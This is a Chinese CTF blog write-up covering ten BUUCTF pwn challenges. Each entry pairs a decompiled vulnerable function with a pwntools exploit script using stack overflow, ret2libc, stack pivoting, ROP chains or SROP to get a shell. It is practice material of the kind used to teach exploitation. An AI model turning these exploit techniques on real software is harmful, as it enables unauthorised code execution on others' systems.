+<h1 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a><font style="color:rgb(33, 37, 41);">bjdctf_2020_babyrop</font></h1><blockquote>
+<p>考点</p>
+<ul>
+<li>64位栈溢出</li>
+<li>Ret2libc</li>
+<li>ROPgadget</li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">ssize_t vuln()<br>&#123;<br>  _BYTE buf[<span class="hljs-number">32</span>]; // [rsp+0h] [rbp-20h] BYREF<br><br>  puts(<span class="hljs-string">&quot;Pull up your sword and tell me u story!&quot;</span>);<br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, 0x64uLL);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br>func_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>func_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>again = elf.sym[<span class="hljs-string">&#x27;vuln&#x27;</span>]<br><br>overoff = <span class="hljs-number">0x20</span>+<span class="hljs-number">8</span><br><br>rdiRet = <span class="hljs-number">0x0000000000400733</span><br>Ret = <span class="hljs-number">0x00000000004004c9</span><br><br>payload = overoff * <span class="hljs-string">b&#x27;a&#x27;</span><br>payload += p(rdiRet) + p(func_got) + p(func_plt) <br>payload += p(again)<br><br>sla(<span class="hljs-string">&quot;story!\n&quot;</span>,payload)<br><br>funcAddr = u(rl().strip()[:<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lgs(<span class="hljs-built_in">hex</span>(funcAddr))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,funcAddr)<br>libcBase = funcAddr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>sysAddr = libcBase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>shellStr = libcBase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>payload = overoff * <span class="hljs-string">b&#x27;a&#x27;</span> + p(Ret) + p(rdiRet) + p(shellStr) + p(sysAddr)<br><br>sl(payload)<br></code></pre></td></tr></table></figure>
+
+<h1 id="jarvisoj-tell-me-something"><a href="#jarvisoj-tell-me-something" class="headerlink" title="jarvisoj_tell_me_something"></a><font style="color:rgb(33, 37, 41);">jarvisoj_tell_me_something</font></h1><blockquote>
+<p>考点</p>
+<ul>
+<li>64位栈溢出+后门</li>
+<li>栈平衡</li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __fastcall main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  __int64 buf_; // [rsp+0h] [rbp-88h] BYREF<br><br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Input your message:\n&quot;</span>, 0x14uLL);<br>  read(<span class="hljs-number">0</span>, &amp;buf_, 0x100uLL);<br>  <span class="hljs-keyword">return</span> write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;I have received your message, Thank you!\n&quot;</span>, 0x29uLL);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br>payload = junk(<span class="hljs-number">0x88</span>) + p(elf.sym[<span class="hljs-string">&#x27;good_game&#x27;</span>]+<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
+
+<h1 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a><font style="color:rgb(33, 37, 41);">ciscn_2019_es_2</font></h1><blockquote>
+<p>考点</p>
+<ul>
+<li>栈迁移</li>
+<li>数据收集</li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> vul()<br>&#123;<br>  char s[<span class="hljs-number">40</span>]; // [esp+0h] [ebp-28h] BYREF<br><br>  memset(s, <span class="hljs-number">0</span>, 0x20u);<br>  read(<span class="hljs-number">0</span>, s, 0x30u);<br>  printf(<span class="hljs-string">&quot;Hello, %s\n&quot;</span>, s);<br>  read(<span class="hljs-number">0</span>, s, 0x30u);<br>  <span class="hljs-keyword">return</span> printf(<span class="hljs-string">&quot;Hello, %s\n&quot;</span>, s);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## p(0)是call system的返回地址</span><br><span class="hljs-comment">## p(buf+0xc)----&gt;/bin/sh\x00</span><br>leave_ret = <span class="hljs-number">0x080485FD</span><br><br>payload = junk(<span class="hljs-number">0x24</span>) + <span class="hljs-string">b&#x27;TTTT&#x27;</span><br>s(payload)<br>ru(<span class="hljs-string">&#x27;TTTT&#x27;</span>)<br>main_ebp = u(r(<span class="hljs-number">4</span>))<br>lgs(<span class="hljs-built_in">hex</span>(main_ebp))<br><br>buf = main_ebp - <span class="hljs-number">0x38</span><br>lgs(<span class="hljs-built_in">hex</span>(buf))<br><br>payload = p(elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]) + p(<span class="hljs-number">0</span>) + p(buf+<span class="hljs-number">0xc</span>) + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br>payload = payload.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) + p(buf-<span class="hljs-number">4</span>) + p(leave_ret)<br>sl(payload)<br></code></pre></td></tr></table></figure>
+
+<h1 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a><font style="color:rgb(33, 37, 41);">[HarekazeCTF2019]baby_rop2</font></h1><blockquote>
+<p>考点</p>
+<ul>
+<li>64位栈溢出</li>
+<li>Ret2libc</li>
+<li>ROPgadget</li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __fastcall main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  char buf[<span class="hljs-number">28</span>]; // [rsp+0h] [rbp-20h] BYREF<br>  <span class="hljs-built_in">int</span> v5; // [rsp+1Ch] [rbp-4h]<br><br>  setvbuf(stdout, 0LL, <span class="hljs-number">2</span>, 0LL);<br>  setvbuf(stdin, 0LL, <span class="hljs-number">2</span>, 0LL);<br>  printf(<span class="hljs-string">&quot;What&#x27;s your name? &quot;</span>);<br>  v5 = read(<span class="hljs-number">0</span>, buf, 0x100uLL);<br>  buf[v5 - <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  printf(<span class="hljs-string">&quot;Welcome to the Pwn World again, %s!\n&quot;</span>, buf);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br>func_plt = elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>func_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>again = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>overoff = <span class="hljs-number">0x20</span>+<span class="hljs-number">8</span> - <span class="hljs-number">4</span> <br><br>rdiRet = <span class="hljs-number">0x0000000000400733</span><br>rsi_r15_ret = <span class="hljs-number">0x0000000000400731</span><br>fmt = <span class="hljs-number">0x0400770</span><br>Ret = <span class="hljs-number">0x00000000004004d1</span><br><br>payload = overoff * <span class="hljs-string">b&#x27;a&#x27;</span> + <span class="hljs-string">b&#x27;TTTT&#x27;</span><br>payload += p(rdiRet) + p(fmt) + p(rsi_r15_ret) + p(func_got) + p(<span class="hljs-number">0</span>) + p(func_plt) <br>payload += p(again)<br><br>sla(<span class="hljs-string">&quot;name? &quot;</span>,payload)<br>rl()<br>ru(<span class="hljs-string">&#x27;again, &#x27;</span>)<br><br>funcAddr = u(rl().strip()[:<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lgs(<span class="hljs-built_in">hex</span>(funcAddr))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;read&#x27;</span>,funcAddr)<br>libcBase = funcAddr - libc.dump(<span class="hljs-string">&#x27;read&#x27;</span>)<br><br>sysAddr,shellStr = SLSysBin(libc,libcBase)<br><br>payload = overoff * <span class="hljs-string">b&#x27;a&#x27;</span> + <span class="hljs-string">b&#x27;TTTT&#x27;</span> + p(Ret) + p(rdiRet) + p(shellStr) + p(sysAddr)<br><br>sl(payload)<br></code></pre></td></tr></table></figure>
+
+<h1 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop chain"></a><font style="color:rgb(33, 37, 41);">picoctf_2018_rop chain</font></h1><blockquote>
+<p>考点</p>
+<ul>
+<li>栈溢出</li>
+<li>函数参数调整</li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python">void win_function1()<br>&#123;<br>  win1 = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-built_in">int</span> __cdecl win_function2(<span class="hljs-built_in">int</span> a1)<br>&#123;<br>  <span class="hljs-built_in">int</span> win1; // eax<br><br>  win1 = (unsigned __int8)::win1;<br>  <span class="hljs-keyword">if</span> ( ::win1 &amp;&amp; a1 == <span class="hljs-number">0xBAAAAAAD</span> )<br>  &#123;<br>    win2 = <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( ::win1 )<br>  &#123;<br>    <span class="hljs-keyword">return</span> puts(<span class="hljs-string">&quot;Wrong Argument. Try Again.&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-keyword">return</span> puts(<span class="hljs-string">&quot;Nope. Try a little bit harder.&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> win1;<br>&#125;<br><br><span class="hljs-built_in">int</span> __cdecl flag(<span class="hljs-built_in">int</span> a1)<br>&#123;<br>  char s[<span class="hljs-number">48</span>]; // [esp+Ch] [ebp-3Ch] BYREF<br>  FILE *stream; // [esp+3Ch] [ebp-Ch]<br><br>  stream = fopen(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( !stream )<br>  &#123;<br>    puts(<br>      <span class="hljs-string">&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.&quot;</span>);<br>    exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  fgets(s, <span class="hljs-number">48</span>, stream);<br>  <span class="hljs-keyword">if</span> ( win1 &amp;&amp; win2 &amp;&amp; a1 == <span class="hljs-number">0xDEADBAAD</span> )<br>    <span class="hljs-keyword">return</span> printf(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>  <span class="hljs-keyword">if</span> ( win1 &amp;&amp; win2 )<br>    <span class="hljs-keyword">return</span> puts(<span class="hljs-string">&quot;Incorrect Argument. Remember, you can call other functions in between each win function!&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( win1 || win2 )<br>    <span class="hljs-keyword">return</span> puts(<span class="hljs-string">&quot;Nice Try! You&#x27;re Getting There!&quot;</span>);<br>  <span class="hljs-keyword">return</span> puts(<span class="hljs-string">&quot;You won&#x27;t get the flag that easy..&quot;</span>);<br>&#125;<br><br>char *vuln()<br>&#123;<br>  char s[<span class="hljs-number">24</span>]; // [esp+0h] [ebp-18h] BYREF<br><br>  printf(<span class="hljs-string">&quot;Enter your input&gt; &quot;</span>);<br>  <span class="hljs-keyword">return</span> gets(s);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 注意每个参数所需要的参数已经其的返回地址即可构造一个ROP链</span><br>payload = junk(<span class="hljs-number">0x1c</span>) + p(elf.sym[<span class="hljs-string">&#x27;win_function1&#x27;</span>]) + p(elf.sym[<span class="hljs-string">&#x27;win_function2&#x27;</span>]) + p(elf.sym[<span class="hljs-string">&#x27;flag&#x27;</span>]) <br>payload += p(<span class="hljs-number">0xBAAAAAAD</span>) + p(<span class="hljs-number">0xDEADBAAD</span>)<br>sl(payload)<br></code></pre></td></tr></table></figure>
+
+<h1 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a><font style="color:rgb(33, 37, 41);">pwn2_sctf_2016</font></h1><blockquote>
+<p>考点</p>
+<ul>
+<li>32位栈溢出</li>
+<li>整数溢出</li>
+<li>Ret2libc</li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> vuln()<br>&#123;<br>  char nptr[<span class="hljs-number">32</span>]; // [esp+1Ch] [ebp-2Ch] BYREF<br>  <span class="hljs-built_in">int</span> n32; // [esp+3Ch] [ebp-Ch]<br><br>  printf(<span class="hljs-string">&quot;How many bytes do you want me to read? &quot;</span>);<br>  get_n(nptr, <span class="hljs-number">4</span>);<br>  n32 = atoi(nptr);<br>  <span class="hljs-keyword">if</span> ( n32 &gt; <span class="hljs-number">32</span> )<br>    <span class="hljs-keyword">return</span> printf(<span class="hljs-string">&quot;No! That size (%d) is too large!\n&quot;</span>, n32);<br>  printf(<span class="hljs-string">&quot;Ok, sounds good. Give me %u bytes of data!\n&quot;</span>, n32);<br>  get_n(nptr, n32);<br>  <span class="hljs-keyword">return</span> printf(<span class="hljs-string">&quot;You said: %s\n&quot;</span>, nptr);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 我libcsearh不出来，但是题目给了环境，拿glibc-all-in-one里的2.23来用就行</span><br>sl(<span class="hljs-built_in">str</span>(-<span class="hljs-number">1</span>))<br><br>func_plt = elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>func_got = elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>fmt = <span class="hljs-number">0x080486F8</span>  <br>again = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>overoff = <span class="hljs-number">0x2c</span>+<span class="hljs-number">4</span><br><br>payload = overoff*<span class="hljs-string">b&#x27;a&#x27;</span> + p(func_plt) + p(again) + p(fmt) +p(func_got)<br><br>sla(<span class="hljs-string">&quot;of data!\n&quot;</span>,payload)<br>rl()<br>ru(<span class="hljs-string">&#x27;You said: &#x27;</span>)<br>func_addr = u(r(<span class="hljs-number">4</span>))<br>lgs(<span class="hljs-built_in">hex</span>(func_addr))<br><br>libc = ELF(libcPath+<span class="hljs-string">&#x27;libc-2.23-3.so&#x27;</span>)<br><br>libcBase = func_addr - libc.sym[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><br>sysAddr,shellStr = LLSysBin(libc,libcBase)<br><br>sl(<span class="hljs-built_in">str</span>(-<span class="hljs-number">1</span>))<br>payload = overoff*<span class="hljs-string">b&#x27;a&#x27;</span> + p(sysAddr)+ p(again) + p(shellStr)<br>sl(payload)<br><br></code></pre></td></tr></table></figure>
+
+<h1 id="wustctf2020-getshell"><a href="#wustctf2020-getshell" class="headerlink" title="wustctf2020_getshell"></a><font style="color:rgb(33, 37, 41);">wustctf2020_getshell</font></h1><blockquote>
+<p>考点</p>
+<ul>
+<li>32位栈溢出+后门</li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">ssize_t vulnerable()<br>&#123;<br>  _BYTE buf[<span class="hljs-number">24</span>]; // [esp+0h] [ebp-18h] BYREF<br><br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, 0x20u);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br>payload = junk(<span class="hljs-number">0x1c</span>) + p(elf.sym[<span class="hljs-string">&#x27;shell&#x27;</span>])<br></code></pre></td></tr></table></figure>
+
+<h1 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a><font style="color:rgb(33, 37, 41);">jarvisoj_level3</font></h1><blockquote>
+<p>考点</p>
+<ul>
+<li>32位栈溢出</li>
+<li>Ret2libc</li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">ssize_t vulnerable_function()<br>&#123;<br>  _BYTE buf[<span class="hljs-number">136</span>]; // [esp+0h] [ebp-88h] BYREF<br><br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Input:\n&quot;</span>, 7u);<br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, 0x100u);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 毛病（原件是libc-2.19.so），环境得要[OGeek2019]babyrop题目的libc</span><br>func_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>func_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>again = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>overoff = <span class="hljs-number">0x88</span>+<span class="hljs-number">4</span><br><br>payload = overoff*<span class="hljs-string">b&#x27;a&#x27;</span> + p(func_plt) + p(again) + p(<span class="hljs-number">1</span>) + p(func_got) + p(<span class="hljs-number">4</span>)<br><br>sla(<span class="hljs-string">&quot;Input:\n&quot;</span>,payload)<br><br>func_addr = u(r(<span class="hljs-number">4</span>))<br>lgs(<span class="hljs-built_in">hex</span>(func_addr))<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>libcBase = func_addr - libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>sysAddr,shellStr = LLSysBin(libc,libcBase)<br><br>payload = overoff*<span class="hljs-string">b&#x27;a&#x27;</span> + p(sysAddr) + p(again) + p(shellStr)<br>sla(<span class="hljs-string">&quot;Input:\n&quot;</span>,payload)<br><br><br></code></pre></td></tr></table></figure>
+
+<h1 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a><font style="color:rgb(33, 37, 41);">ciscn_2019_s_3</font></h1><blockquote>
+<p>考点</p>
+<ul>
+<li>SROP</li>
+<li>栈溢出</li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">signed __int64 vuln()<br>&#123;<br>  signed __int64 v0; // rax<br>  char buf[<span class="hljs-number">16</span>]; // [rsp+0h] [rbp-10h] BYREF<br><br>  v0 = sys_read(<span class="hljs-number">0</span>, buf, 0x400uLL);<br>  <span class="hljs-keyword">return</span> sys_write(1u, buf, 0x30uLL);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp（SROP）</span><br><span class="hljs-comment">## 这里注意一个点，记得获取栈地址</span><br><span class="hljs-comment">## 在获取栈地址的时候要记得将本地环境修改到2.27上，不然调试的时候无法实现</span><br><span class="hljs-comment">## 在计算偏移的时候可以利用distance来帮助计算，我这里leak的是[rsp+10]</span><br><span class="hljs-comment">### 想打Ret2syscall----&gt;execve(&#x27;/bin/sh\x00&#x27;,NULL,NULL)，那么就需要解决rdx怎么置零的问题，因为工具没找到rdx的ROPgadget</span><br>rax_ret = <span class="hljs-number">0x04004DA</span><br>syscall_ret = <span class="hljs-number">0x0400517</span><br>again = elf.sym[<span class="hljs-string">&#x27;vuln&#x27;</span>]<br><br>payload = junk(<span class="hljs-number">0x10</span>) + p(again)<br>s(payload)<br>r(<span class="hljs-number">0x20</span>)<br>stack_addr = u(r(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x118</span><br>lgs(<span class="hljs-built_in">hex</span>(stack_addr))<br><br>frame = SigreturnFrame()<br>frame.rax = <span class="hljs-number">0x3b</span><br>frame.rdi = stack_addr + <span class="hljs-number">0x118</span><br>frame.rsi = <span class="hljs-number">0</span><br>frame.rdx = <span class="hljs-number">0</span><br>frame.rip = syscall_ret<br><br>payload = junk(<span class="hljs-number">0x10</span>) + p(rax_ret) + p(syscall_ret) + <span class="hljs-built_in">bytes</span>(frame) + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br>sl(payload)<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/PWN/" class="category-chain-item">PWN</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/PWN/BUUCTF/" class="category-chain-item">BUUCTF</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>PWN-BUUCTF-1</div>
+      <div>https://tforevery.github.io/PWN/BUUCTF/PWN-BUUCTF-1/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>TY</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年4月1日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/PWN/BUUCTF/PWN-BUUCTF-2/" title="PWN-BUUCTF-2">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">PWN-BUUCTF-2</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
